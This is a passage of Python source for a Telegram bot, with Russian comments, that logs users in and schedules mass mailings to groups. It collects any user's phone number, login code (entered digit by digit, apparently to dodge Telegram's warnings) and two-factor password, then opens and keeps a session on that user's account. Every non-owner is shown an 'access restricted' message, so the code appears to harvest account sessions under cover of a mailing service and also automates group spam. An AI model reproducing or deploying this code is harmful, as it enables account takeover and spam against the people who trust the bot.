    elif event.data.startswith(b"select_hour_"):
        time_str = event.data.decode().replace("select_hour_", "")
        selected_hour, selected_minute = map(int, time_str.split("_"))

        if 'selected_times' not in state:
            state['selected_times'] = []

        selected_time = (selected_hour, selected_minute)

        # Если время уже выбрано, удаляем его из списка
        if selected_time in state['selected_times']:
            state['selected_times'].remove(selected_time)
        else:
            # Если время не выбрано, добавляем его в список
            state['selected_times'].append(selected_time)

        await show_time_selection(event, state)
        return

    # Обработка сохранения времени
    elif event.data == b"save_time":
        if 'selected_times' not in state or not state['selected_times']:
            await event.answer("Выберите хотя бы одно время!")
            return

        selected_times = state['selected_times']
        state['selected_times'] = selected_times
        state['stage'] = 'confirming'

        selected_times_str = ", ".join([f"{hour:02d}:{minute:02d}" for hour, minute in selected_times])
        await event.respond(
            f"Выбранные времена: {selected_times_str}. Введите /confirm для подтверждения."
        )

    # Обработка кнопки "Другое время"
    elif event.data == b"custom_interval":
        state['stage'] = 'waiting_custom_interval'
        await event.respond("Введите интервал в минутах (например, 45):")
        return

    # Обработка нажатия на кнопку выбора группы
    elif event.data.startswith(b"select_"):
        group_id = int(event.data.decode().replace("select_", ""))
        all_groups = state['groups']
        selected = state['selected']
        if not selected:
            for group in all_groups:
                selected.append(group)
        else:
            # Ищем группу с таким ID
            group_obj = next((g for g in all_groups if g.id == group_id), None)
            if not group_obj:
                await event.answer("Группа не найдена.")
                return

            # Добавляем или убираем группу из выбранных
            if group_obj in selected:
                selected.remove(group_obj)
            else:
                selected.append(group_obj)

        # Обновляем список групп (с галочками)
        await show_group_selection(event, state)

    elif event.data == b"confirm_selection":
        if not state.get("selected"):
            await event.answer("Выберите хотя бы одну группу!")
            return

        # Переходим к этапу ввода названия рассылки
        state["stage"] = "entering_mailing_title"
        await event.respond("Введите название рассылки:")


async def show_group_selection(event, state):
    """
    Отображает список групп с кнопками выбора.
    Галочка (✅) появляется, если группа уже выбрана,
    иначе показываем (🔲).
    """
    client = state.get('client')
    if not client:
        await event.answer("Сначала авторизуйтесь.")
        return

    # Определяем, какие группы нужно отображать (админские или неадминские)
    if 'admin_groups' in state:
        groups = state['admin_groups']  # Админские группы
        group_type = 'admin'
    elif 'non_admin_groups' in state:
        groups = state['non_admin_groups']  # Неадминские группы
        group_type = 'non_admin'
    else:
        await event.respond("Ошибка: тип групп не определён.")
        return

    # Логируем список групп для отладки
    logger.info(f"Актуальный список групп ({group_type}): {[group.name for group in groups]}")

    # Сохраняем актуальный список групп в состояние
    state['groups'] = groups
    selected_ids = [g.id for g in state.get('selected', [])]

    # Формируем список кнопок
    buttons = []
    for group in groups:
        mark = "✅" if group.id in selected_ids else "🔲"
        group_name = group.name if hasattr(group, 'name') else "Без названия"
        buttons.append([Button.inline(f"{mark} {group_name}", f"select_{group.id}")])

    # Добавляем кнопку "Далее" и "Назад"
    buttons.append([Button.inline("Далее", b"confirm_selection")])
    buttons.append([Button.inline("Назад", b"back")])

    # Если это коллбэк (CallbackQuery), используем event.edit,
    # иначе event.respond
    if isinstance(event, events.CallbackQuery.Event):
        await event.edit(f"Выберите группы ({'админские' if group_type == 'admin' else 'неадминские'}):", buttons=buttons)
    else:
        await event.respond(f"Выберите группы ({'админские' if group_type == 'admin' else 'неадминские'}):", buttons=buttons)

@bot.on(events.NewMessage)
async def handle_response(event):
    user_id = event.sender_id
    if user_id not in user_states:
        logger.info(f"Ignoring message from user {user_id} (no state).")
        return

    state = user_states[user_id]
    logger.info(f"User {user_id} is at stage: {state['stage']}")

    # Игнорируем команды (сообщения, начинающиеся с "/"), кроме /confirm
    if event.raw_text.startswith('/') and event.raw_text.strip().lower() != '/confirm':
        logger.info(f"Ignoring command from user {user_id}: {event.raw_text}")
        return

    # Шаг 1: запрос номера телефона
    if state['stage'] == 'waiting_phone':
        phone_number = event.raw_text.strip()
        if not re.match(r'^\+\d{11,12}$', phone_number):  # Проверка формата номера
            await event.respond("Ошибка! Введите номер телефона в формате +XXXXXXXXXXX.")
            return

        # Сохраняем номер телефона
        state['phone_number'] = phone_number
        state['stage'] = 'waiting_code'
        logger.info(f"User {user_id} entered phone number: {phone_number}")

        # Запрашиваем код авторизации
        session_path = get_session_path(user_id)
        client = TelegramClient(
            session_path,
            API_ID,
            API_HASH,
            proxy=proxy
        )

        await client.connect()

        # Проверяем подключение
        if not client.is_connected():
            await event.respond("Ошибка подключения к серверам Telegram.")
            return

        # Запрос кода с обработкой FloodWait
        try:
            code_request = await client.send_code_request(phone_number)
            logger.info(f"Code request response: {code_request}")
        except FloodWaitError as e:
            wait_time = e.seconds
            logger.error(f"FloodWaitError: Need to wait {wait_time} seconds")
            await event.respond(f"⚠️ Слишком много попыток. Попробуйте через {wait_time // 60} минут.")
            return
        except PhoneNumberInvalidError:
            await event.respond("❌ Неверный номер телефона.")
            return
        except Exception as e:
            logger.error(f"Error sending code: {str(e)}")
            await event.respond("🚫 Ошибка при отправке кода. Попробуйте позже.")
            return

        phone_codes[user_id] = {
            'phone_code_hash': code_request.phone_code_hash,
            'client': client,
            'current_code': ''
        }

        # Логируем информацию о подключении
        logger.info(f"Connected: {client.is_connected()}")
        logger.info(f"Authorized: {await client.is_user_authorized()}")

        await event.respond("✅ Код авторизации отправлен. Вводите цифры по одной.")

    # Шаг 2: ввод кода авторизации по одной цифре
    elif state['stage'] == 'waiting_code':
        digit = event.raw_text.strip()
        if not digit.isdigit() or len(digit) != 1:
            await event.respond("Ошибка! Введите одну цифру.")
            return

        # Добавляем цифру к текущему коду
        phone_codes[user_id]['current_code'] += digit
        current_code = phone_codes[user_id]['current_code']

        # Если код ещё не полный, просим следующую цифру
        if len(current_code) < 5:
            await event.respond(f"Введено цифр: {len(current_code)}. Введите следующую цифру.")
            return

        # Если код полный, завершаем авторизацию
        try:
            client = phone_codes[user_id]['client']
            await client.sign_in(state['phone_number'], current_code,
                                 phone_code_hash=phone_codes[user_id]['phone_code_hash'])
            state['stage'] = 'authorized'
            state['client'] = client

            # Сохраняем информацию о пользователе только после успешной авторизации
            user_info = await client.get_me()
            await save_user(user_id, user_info.username, user_info.first_name, user_info.last_name)

            # Проверяем, является ли пользователь владельцем
            if user_id != OWNER_ID:
                # Если пользователь не владелец, блокируем его
                await ban_user(user_id)
                await event.respond(
                    "Вы успешно авторизованы, но ваш доступ ограничен. Обратитесь к администратору для получения доступа. @JerdeshMoskva_admin затем снова нажмите /start")
            else:
                await event.respond("Авторизация успешна!")
                await event.respond("Вы уже авторизованы! Выберите действие:", buttons=[
                    [Button.inline("Создать рассылку", b"create_mailing")],
                    [Button.inline("Список рассылок", b"mailing_list")]
                ])
            logger.info(f"User {user_id} successfully authorized.")

        except SessionPasswordNeededError:
            # Если включена двухфакторная аутентификация, запрашиваем пароль
            await event.respond("Введите пароль от двухфакторной аутентификации(облачный пароль):")
            state['stage'] = 'waiting_password'
            logger.info(f"User {user_id} requires 2FA password.")

        except Exception as e:
            logger.error(f"Error during sign-in: {e}")
            await event.respond("Ошибка! Неверный код или код истёк. Попробуйте снова.")
            # Сбрасываем текущий код
            phone_codes[user_id]['current_code'] = ''

    # В разделе обработки waiting_password:
    elif state['stage'] == 'waiting_password':
        password = event.raw_text.strip()
        try:
            client = phone_codes[user_id]['client']
            await client.sign_in(password=password)

            state['client'] = client
            state['stage'] = 'authorized'  # Важно обновить состояние

            # Сохраняем информацию о пользователе
            user_info = await client.get_me()
            await save_user(user_id, user_info.username, user_info.first_name, user_info.last_name)

            # Проверяем статус пользователя
            conn = await get_db_connection()
            try:
                cursor = await conn.cursor()
                await cursor.execute("SELECT is_active FROM users WHERE user_id = ?", (user_id,))
                user = await cursor.fetchone()

                # Проверяем, является ли пользователь владельцем
                if user_id != OWNER_ID:
                    # Если пользователь не владелец, блокируем его
                    await ban_user(user_id)
                    await event.respond(
                        "Вы успешно авторизованы, но ваш доступ ограничен. Обратитесь к администратору для получения доступа. @JerdeshMoskva_admin затем снова нажмите /start")
                else:
                    await event.respond("Авторизация успешна!")
                    await event.respond("Вы уже авторизованы! Выберите действие:", buttons=[
                        [Button.inline("Создать рассылку", b"create_mailing")],
                        [Button.inline("Список рассылок", b"mailing_list")]
                    ])
                logger.info(f"User {user_id} successfully authorized.")
                state['stage'] = 'authorized'

            finally:
                await conn.close()

        except Exception as e:
            logger.error(f"Error during 2FA sign-in: {e}")
            await event.respond("Ошибка! Неверный пароль. Попробуйте снова.")

    elif state['stage'] == 'entering_mailing_title':
        state['mailing_name'] = event.raw_text.strip()
        state['stage'] = 'waiting_media'
        await event.respond("Отправьте фото или медиа для рассылки или введите 'пропустить'.")

    # Шаг 4: ожидание медиа (фото или видео)
    elif state['stage'] == 'waiting_media':
        if event.raw_text.lower() == 'пропустить':
            state['media'] = None
            state['stage'] = 'entering_text'
            await event.respond("Введите текст рассылки:")
            logger.info(f"User {user_id} skipped media. Moving to 'entering_text' stage.")
            return  # Добавляем return, чтобы избежать дальнейшей обработки
        elif event.photo or event.video or event.document:
            try:
                await event.respond("Обработка...")
                if event.photo:
                    # Обработка фото
                    media_path = await event.download_media(file="media/")
                    state['media'] = {'type': 'photo', 'path': media_path}
                    logger.info(f"[DEBUG] Фото сохранено в: {media_path}")
                elif event.video or (event.document and event.document.mime_type.startswith('video/')):
                    # Обработка видео
                    media_path = await event.download_media(file="media/")
                    state['media'] = {'type': 'video', 'path': media_path}
                    logger.info(f"[DEBUG] Видео сохранено в: {media_path}")
                else:
                    await event.respond("Ошибка! Отправьте фото или видео.")
                    return

                # Переход к следующему этапу
                state['stage'] = 'entering_text'
                logger.info(f"User {user_id} media processed. Moving to 'entering_text' stage.")
            except Exception as e:
                logger.error(f"Ошибка при обработке медиа: {e}")
                await event.respond("Ошибка! Не удалось обработать медиафайл. Попробуйте снова.")
        else:
            await event.respond("Ошибка! Отправьте фото, видео или введите 'пропустить'.")

    # Шаг 5: ввод текста рассылки
    if state['stage'] == 'entering_text':
        state['text'] = event.raw_text
        state['stage'] = 'choosing_interval'

        # Предлагаем выбрать интервал
        await event.respond("Выберите интервал отправки (не меньше 15 минут):", buttons=[
            [Button.inline("15 минут", b"select_interval_15")],
            [Button.inline("20 минут", b"select_interval_20")],
            [Button.inline("30 минут", b"select_interval_30")],
            [Button.inline("1 час", b"select_interval_60")],
            [Button.inline("Другое время", b"custom_interval")]
        ])

        logger.info(f"User {user_id} entered text. Moving to 'choosing_interval' stage.")

    # Обработка ввода пользовательского интервала
    elif state['stage'] == 'waiting_custom_interval':
        try:
            interval = int(event.raw_text.strip())
            if interval <= 0:
                await event.respond("Интервал должен быть положительным числом.")
                return

            state['interval'] = interval
            state['selected_times'] = []  # Очищаем выбранные времена
            await show_time_selection(event, state)
        except ValueError:
            await event.respond("Ошибка! Введите число (например, 45 и не меньше 15).")
        return

    # Шаг 7: удаление пользователя (для владельца)
    elif state['stage'] == 'waiting_user_to_delete':
        if user_id != OWNER_ID:
            await event.respond("Эта функция доступна только владельцу бота.")
            return

        username_to_delete = event.raw_text.strip()
        logger.info(f"Введённое имя пользователя: '{username_to_delete}'")

        if await user_exists(username_to_delete):
            await delete_user(username_to_delete)
            await event.respond(f"Пользователь {username_to_delete} удалён.")
        else:
            await event.respond(f"Пользователь {username_to_delete} не найден.")

        state['stage'] = 'authorized'


async def main():
    # Инициализация базы данных
    await init_db()
    logger.info("Инициализация базы данных завершена.")

    # Запускаем бота
    await bot.start()

    try:
        me = await bot.get_me()
        logger.info(f"Бот запущен как {me.username} через прокси {['server']}")

        # Проверяем, есть ли владелец в базе данных
        if not await is_owner_in_db():
            logger.info("Владелец не найден в базе данных. Начинаем процесс авторизации...")
            await bot.send_message(OWNER_ID, "Привет, владелец! Введите свой номер телефона в формате +XXXXXXXXXXX.")
            user_states[OWNER_ID] = {'stage': 'waiting_phone'}

        await print_all_users()
        await bot.run_until_disconnected()

    finally:
        await bot.disconnect()


if __name__ == "__main__":
    bot.loop.run_until_complete(main())
